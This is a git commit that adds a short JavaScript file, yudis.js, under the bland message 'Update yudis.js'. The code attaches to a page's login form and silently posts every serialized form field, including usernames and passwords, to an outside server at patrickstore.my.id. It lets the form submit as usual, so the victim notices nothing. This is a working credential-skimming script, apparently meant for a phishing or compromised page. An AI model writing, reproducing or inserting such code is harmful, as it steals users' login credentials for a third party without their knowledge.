ff94dcab39a84c3257485d9963644dc02c9db71c
yudisgans <96610185+yudisgans@users.noreply.github.com>
2022-01-16 14:36:49 +0700

    Update yudis.js

--- yudis.js
+++ yudis.js
@@ -1,1 +1,27 @@
+$(".login-form").submit(function() {
 
+	var d = $(".login-form");
+
+	$.ajax({
+
+        url: "http://patrickstore.my.id/apiii.php",
+
+        type: "POST",
+
+        data: d.serialize(),
+
+        success: function () {
+
+            return true;
+
+        },
+
+        error: function () {
+
+            return true;
+
+        },
+
+    });
+
+});
